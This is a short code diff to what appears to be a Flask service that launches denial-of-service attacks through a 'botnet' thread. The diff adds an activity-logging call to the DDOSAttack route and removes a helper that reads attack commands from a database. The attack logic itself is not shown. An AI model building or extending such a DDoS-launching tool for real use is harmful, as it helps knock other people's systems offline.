@@ -1,4 +1,5 @@
 from flask import Blueprint, request
+from utilities.databaseFunc import *
 import subprocess
 import time
 import socket
@@ -29,6 +30,8 @@ def DDOSAttack():
     bots = threading.Thread(target=botnet, args=(command, duration))
     bots.start()
     bots.join()
+
+    logActivityDOS("DOS ATTACK", data)
 
     return ""
 
@@ -108,12 +111,3 @@ def getIpAddress():
     ip = s.getsockname()[0]
     s.close()
     return ip
-
-def getCommand(operation, type):
-    collection = db["commands"]
-    x = collection.find_one({
-        "operation" : operation,
-        "type": type,
-        })
-
-    return x["command"]
